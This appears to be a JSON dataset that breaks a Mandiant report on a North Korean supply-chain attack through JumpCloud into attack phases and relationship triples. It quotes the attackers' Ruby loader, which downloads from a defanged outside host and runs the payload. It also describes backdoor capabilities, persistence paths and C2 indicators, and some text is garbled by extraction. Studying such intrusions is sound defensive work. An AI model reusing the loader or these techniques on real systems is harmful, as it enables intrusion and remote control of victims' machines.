[
    {
        "phase": "initial access",
        "content": "Initial access was gained by compromising JumpCloud and inserting malicious code into their commands framework. In at least one instance, the malicious code was a lightweight Ruby script that was executed via the JumpCloud agent. The script contained instructions to download and execute a second stage payload. Within 24 hours of gaining \nNorth Korea Leverages SaaS Provider in a Targeted Supply Chain Attack | Mandiant | Google Cloud Blog initial access to systems in the victim environment, the threat actor deployed additional backdoors and established persistence via plists. The initial payloads and second stage backdoors were removed from the system. \nThe directory choices and naming conventions of the Ruby script and second stage payloads indicated the threat actor placed significant priority into masquerading as legitimate files and applications. \nMandiant retrieved the lightweight Ruby script named init.rb  that was deployed to multiple systems: \nrequire 'open-uri'   \nffn $=$ '/usr/local/bin/com.docker.vmnat'   \nFile.open(ffn, 'wb') do |file|   \nfile.write(open('hxxps://primerosauxiliosp   \nend   \nsleep(1)   \nFile.chmod(0755, ffn)   \nfn $=$ '/usr/local/bin/com.docker.vmnat.lock   \nFile.open(fn, 'wb') do |file|   \nfile.write(open('hxxps://primerosauxiliosp   \nend   \nsleep(1)   \nsystem(ffn) \nThe script downloads two files to locations defined by the variables ffn and fn, but only the first file is executed via the system function. The second file could not be identified on the hosts. ",
        "relationship": "1. [Relationships]: <process:JumpCloud agent,executed,file:lightweight Ruby script>. \n2. [Relationships]: <process:lightweight Ruby script,downloads,file:hxxps://primerosauxiliosp>. \n3. [Relationships]: <process:lightweight Ruby script,downloads,file:hxxps://primerosauxiliosp>. \n4. [Relationships]: <process:lightweight Ruby script,executes,file:/usr/local/bin/com.docker.vmnat>. \n5. [Relationships]: <process:lightweight Ruby script,creates,file:/usr/local/bin/com.docker.vmnat.lock>. ",
        "semantic_relationship": "[System-level Relationships]: <process:JumpCloud agent,Execute,file:lightweight Ruby script>. \n[System-level Relationships]: <process:lightweight Ruby script,Write,file:hxxps://primerosauxiliosp>. \n[System-level Relationships]: <process:lightweight Ruby script,Write,file:hxxps://primerosauxiliosp>. \n[System-level Relationships]: <process:lightweight Ruby script,Execute,file:/usr/local/bin/com.docker.vmnat>. \n[System-level Relationships]: <process:lightweight Ruby script,Create,file:/usr/local/bin/com.docker.vmnat.lock>. "
    },
    {
        "phase": "execution",
        "content": "The threat actor downloaded and executed   \n/usr/local/bin/com.docker.vmnat  using the aforementioned Ruby script. However,   \ncom.docker.vmnat  was removed from the system. Fortunately, an artifact of its execution was   \ndiscovered in the /private/var/db/oah   \ndirectory. \nBecause com.docker.vmnat was likely compiled for x86-64 systems, the code had to be translated to ARM64 to successfully execute on the target system. As a result, Apple's Rosetta 2 translator produced a com.docker.vmnat.aot  file under the oah directory that included the translated ARM64 code as well as symbols present in the original com.docker.vmnat  application. Based on these symbols, Mandiant assesses with moderate confidence that com.docker.vmnat  was a version of the FULLHOUSE.DOORED backdoor. \nFULLHOUSE.DOORED is a backdoor written in $\\mathsf{C}/\\mathsf{C}++$ that communicates using HTTP. It incorporates the capabilities of the FULLHOUSE tunneler in addition to supporting backdoor commands including shell command execution, file transfer, file management, and process injection. The command and control (C2) server must be configured from either the command line or a configuration file. \nAdditional attacker backdoors identified on systems with names that masquaraded as legitimate binaries and also produced AOT files upon translation (e.g., npx-cli  and npx-cli.aot ). ",
        "relationship": "1. [Relationships]: <process:Ruby script,downloaded and executed,file:/usr/local/bin/com.docker.vmnat>. \n2. [Relationships]: <process:Apple's Rosetta 2 translator,produced,file:/private/var/db/oah/com.docker.vmnat.aot>. \n3. [Relationships]: <process:FULLHOUSE.DOORED,communicates with,socket:HTTP>. ",
        "semantic_relationship": "[System-level Relationships]: <process:Ruby script,Execute,file:/usr/local/bin/com.docker.vmnat>. \n[System-level Relationships]: <process:Apple's Rosetta 2 translator,Create,file:/private/var/db/oah/com.docker.vmnat.aot>. \n[System-level Relationships]: <process:FULLHOUSE.DOORED,Connect,socket:HTTP>. "
    },
    {
        "phase": "command and control",
        "content": "Limited forensic evidence existed to determine exactly how STRATOFEAR was deployed to systems in the victim environment; however, in each instance, STRATOFEAR was preceded by the deployment of FULLHOUSE.DOORED. On the systems analyzed, only one backdoor remained on the system, indicating the threat actor may have used FULLHOUSE.DOORED as a first-stage backdoor before deploying STRATOFEAR as a second-stage backdoor. \nSTRATOFEAR is a modular backdoor that communicates with C2 servers using a protocol specified in its C2 configuration, which is decrypted from a local file. The backdoor's primary functionality involves retrieving and executing additional modules. Modules may be downloaded from a remote server or loaded from disk. \nSTRATOFEAR contains an embedded configuration that includes two file paths. The first path ( /Library/Fonts/ArialUnicode.ttf.md5 ) stores the backdoor's full configuration, including its C2 servers. The second path \n( /Library/Fonts/ArialUnicode.ttf.md5.1 ) may be used to store logging information related to monitor activity that is described as follows. \nA portion of STRATOFEAR's 0x1052-byte decrypted configuration is shown as follows. \nSTRATOFEAR refers to the four-byte value at offset 0x410 ( 0x16325 ) as a uid. The four-byte value at offset $0\\times416$ ( 0x3e8  or decimal 1000 ) is the backdoor's version number. STRATOFEAR's configuration file may include AES-128-encrypted modules; however, this was not the case in the discovered sample. \nA subset of commands supported by STRATOFEAR are listed in the following table: \nSystem information collected using command 0x07 includes the system name, current username, and the system's architecture. \nSTRATOFEAR supports the module-related commands listed in the following table: \nDownloaded modules may be written to a .tmp  file in the $\\$1$ TMPDIR  or /tmp  directory. The file's name consists of six randomly-generated alphanumeric characters. \nSTRATOFEAR's code references five predefined module types that have an ID value and an internal name: \nSTRATOFEAR also contains strings that are used to report a module's location. Possible locations are Config \", \" Static \", or \" Path \" followed by a file path. \nSTRATOFEAR  employs what it refers to as \"monitors\" to monitor system activity using up to 16 threads. The backdoor references eight different monitors and includes descriptions for all but one $(\\theta\\times45)$ . \nMandiant directly observed one (1) variant of STRATOFEAR as a Mach-O executable compiled for ARM64 systems that contained a self-signed certificate with a particular Common Name (CN). Mandiant identified a second sample on VirusTotal with the same self-signed certificate CN. The second sample is a Windows DLL protected using VMProtect that was first submitted to VirusTotal on October 19, 2022. Mandiant assesses with moderate confidence that the DLL is a Windows version of STRATOFEAR. ",
        "relationship": "[Relationships]: None.",
        "semantic_relationship": "None"
    },
    {
        "phase": "command and control",
        "content": "Limited forensic evidence existed to determine exactly how TIEDYE was deployed to systems in the victim environment; however, like STRATOFEAR, TIEDYE was likely deployed as a second-stage backdoor by FULLHOUSE.DOORED. \nA Mach-O executable named xpc.protect was identified and determined to be an evolution of the TIEDYE backdoor. TIEDYE can communicate with a C2 server using a range of supported protocols described as follows. Its capabilities include retrieving and executing additional payloads, collecting basic system information, and executing shell commands. \nA portion of TIEDYE's raw configuration is shown as follows: \nThe configuration contains two C2 servers that are prefixed with a protocol identifier. TIEDYE supports the following \nprotocols:  tcp ,  tcp6 ,  udp ,  upd6 ,  http , https ,  proxy_socks4 ,  proxy_socks4a ,  pipe , ssl ,  ssl3 , and  rdp . The file path at the end of the configuration is used to store configuration data that is encrypted using AES-128. \nPrevious versions of TIEDYE were configured to persist via a LaunchAgent. The current version contains the functionality to create a LaunchAgent at one of the following locations but is not configured to do so: \n\\$HOME/Library/LaunchAgents/com.studentd.agent.plist /Library/LaunchDaemons/com.studentd.agent.plist \nTIEDYE has similarities to RABBITHUNT, which is a backdoor written in $\\mathsf{C}\\substack{++}$ that communicates via a custom binary protocol over TCP. RABBITHUNT's core functionality is implemented through modules d\uedd9ownloaded directly into memory or read from a local file. Capabilities added via modules include \nNorth Korea Leverages SaaS Provider in a Targeted Supply Chain Attack | Mandiant | Google Cloud Blog reverse shell, file transfer, process creation, and process termination. ",
        "relationship": "[Relationships]: None.",
        "semantic_relationship": "None"
    },
    {
        "phase": "command and control",
        "content": "Mandiant has observed RGB units utilize a series of Operational Relay Boxes (ORBs) using L2TP IPsec tunnels along with commercial VPN providers to \nNorth Korea Leverages SaaS Provider in a Targeted Supply Chain Attack | Mandiant | Google Cloud Blog obscure their source address. These relays seem to be heavily shared among units under the RGB umbrella. \nMandiant observed UNC4899 utilize various VPN providers as a final hop, the most common being ExpressVPN, but connections to NordVPN, TorGuard and many other providers have also been observed. There have been many occasions in which DPRK threat actors did not employ this last hop, or mistakenly did not utilize this while conducting actions on operations on the victim's network. \nThe VPNs used by RGB actors occasionally fail, which reveals the IP addresses of the actor's true origins. Mandiant observed the DPRK threat actor UNC4899 connecting directly to an attackercontrolled ORB from their 175.45.178[.]0/24 subnet. (Ryugyong Dong, Pyongyang). Additionally we observed the DPRK threat actor log directly into a Pyongyang IP, from one of their jump boxes. Our evidence supports that this was an OPSEC slip up since the connection to the North Korean netblock was short-lived. Figure 2 provides an overview of the network infrastructure used in this campaign. \nAdditionally, Mandiant was able to uncover additional infrastructure due to the fact that a PTR record was never changed from a previous operation. Mandiant has previously identified the domain wasxxv[.]site being used by North Korean threat actors. Additionally, the IP address 198.244.135[.]250 is being utilized for another C2 domain prontoposer[.]com while still having a PTR record to the domain previously identified. ",
        "relationship": "[Relationships]: None.",
        "semantic_relationship": "None"
    },
    {
        "phase_relationship": [
            {
                "phase": "initial access",
                "relationship": "[Original Relationships]: <process:JumpCloud agent,executed,file:lightweight Ruby script>. ",
                "semantic_relationship": "[System-level Relationships]: <process:JumpCloud agent,Execute,file:lightweight Ruby script>. "
            },
            {
                "phase": "initial access",
                "relationship": "[Original Relationships]: <process:lightweight Ruby script,downloads,file:hxxps://primerosauxiliosp>. ",
                "semantic_relationship": "[System-level Relationships]: <process:lightweight Ruby script,Write,file:hxxps://primerosauxiliosp>. "
            },
            {
                "phase": "initial access",
                "relationship": "[Original Relationships]: <process:lightweight Ruby script,downloads,file:hxxps://primerosauxiliosp>. ",
                "semantic_relationship": "[System-level Relationships]: <process:lightweight Ruby script,Write,file:hxxps://primerosauxiliosp>. "
            },
            {
                "phase": "initial access",
                "relationship": "[Original Relationships]: <process:lightweight Ruby script,executes,file:/usr/local/bin/com.docker.vmnat>. ",
                "semantic_relationship": "[System-level Relationships]: <process:lightweight Ruby script,Execute,file:/usr/local/bin/com.docker.vmnat>. "
            },
            {
                "phase": "initial access",
                "relationship": "[Original Relationships]: <process:lightweight Ruby script,creates,file:/usr/local/bin/com.docker.vmnat.lock>. ",
                "semantic_relationship": "[System-level Relationships]: <process:lightweight Ruby script,Create,file:/usr/local/bin/com.docker.vmnat.lock>. "
            },
            {
                "phase": "execution",
                "relationship": "[Original Relationships]: <process:Ruby script,downloaded and executed,file:/usr/local/bin/com.docker.vmnat>. ",
                "semantic_relationship": "[System-level Relationships]: <process:Ruby script,Execute,file:/usr/local/bin/com.docker.vmnat>. "
            },
            {
                "phase": "execution",
                "relationship": "[Original Relationships]: <process:Apple's Rosetta 2 translator,produced,file:/private/var/db/oah/com.docker.vmnat.aot>. ",
                "semantic_relationship": "[System-level Relationships]: <process:Apple's Rosetta 2 translator,Create,file:/private/var/db/oah/com.docker.vmnat.aot>. "
            },
            {
                "phase": "execution",
                "relationship": "[Original Relationships]: <process:FULLHOUSE.DOORED,communicates with,socket:HTTP>. ",
                "semantic_relationship": "[System-level Relationships]: <process:FULLHOUSE.DOORED,Connect,socket:HTTP>. "
            }
        ]
    }
]